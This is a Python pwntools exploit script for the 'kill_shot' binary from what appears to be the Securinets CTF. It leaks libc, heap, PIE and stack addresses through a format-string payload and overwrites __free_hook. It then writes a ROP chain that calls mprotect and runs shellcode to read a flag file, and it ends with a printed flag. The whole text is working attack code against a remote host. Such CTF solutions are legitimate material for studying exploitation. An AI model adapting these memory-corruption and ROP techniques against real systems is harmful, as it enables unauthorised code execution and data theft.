#!/usr/bin/python3

from pwn import *

PATH = './kill_shot'

GDBSCRIPT = '''
b *0x555555555098
b *0x555555555237
'''

HOST = 'bin.q21.ctfsecurinets.com'
PORT = 1338

def debug(gdbscript):
    if type(r) == process:
        gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/.gdbinit_pwndbg'"])

def add(size, data):
    r.sendlineafter('exit\n', '1')
    r.sendlineafter(': ', f'{size}')
    r.sendlineafter(': ', data)

def delete(idx):
    r.sendlineafter('exit\n', '2')
    r.sendlineafter(': ', f'{idx}')

def kill(ptr, data):
    add(40, 'FOR TRIGGER KILL'); delete(1)
    r.sendlineafter(': ', f'{ptr}')
    r.sendafter(': ', data)

def exploit(r):
    payload = "%4$p||%6$p||%25$p||%13$p||"
    r.sendlineafter(': ', payload)

    leaks = r.recvline(0).split(b'||')[:-1]

    heap, stack, libc_start_main, pie = map(lambda x: int(x, 16), leaks)

    libc.address = libc_start_main - 0x21b97
    elf.address = pie - 0xd8c

    info(f'LIBC 0x{libc.address:x}')
    info(f'HEAP 0x{heap:x}')
    info(f'PIE 0x{elf.address:x}')
    info(f'STACK 0x{stack:x}')

    r.sendlineafter(': ', f'{libc.sym.__free_hook}')
    r.sendlineafter(': ', p64(elf.sym.kill))

    # calculate very usefull address
    shellcode_start = heap + 0xe90

    # open-read-write shellcode
    shellcode  = shellcraft.openat(0, '/home/ctf/flag.txt', 0)
    shellcode += shellcraft.read('rax', 'rsp', 0x47)
    shellcode += shellcraft.write(1, 'rsp', 0x47)

    add(200, asm(shellcode))

    rop = ROP(libc)
    rop.call(libc.sym.mprotect, [heap - 0x260, 0x21000, 0x7])

    payload = bytes(rop) + p64(shellcode_start)
    saved_rip = stack - 0xD8
    
    # write rop chain to saved_rip
    for offset in range(0, len(payload), 8):
        kill(saved_rip+offset, payload[offset:offset+8])

    debug(GDBSCRIPT)

    # profit
    r.sendlineafter('exit\n', '3') # exit
    
    # flag{this_really_needs_a_kill_shot!_cc5dcc74acd62fa74899efaff22d8f79}
    print(r.recvline(0))

    r.interactive()

if __name__ == '__main__':
    elf  = ELF(PATH)
    libc = ELF('./libc.so.6', 0)

    context.arch = 'amd64'
    elf.sym.kill = 0x10B4

    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = process(PATH, aslr=0, env={
            'LD_PRELOAD' : './libc.so.6'
        })
    exploit(r)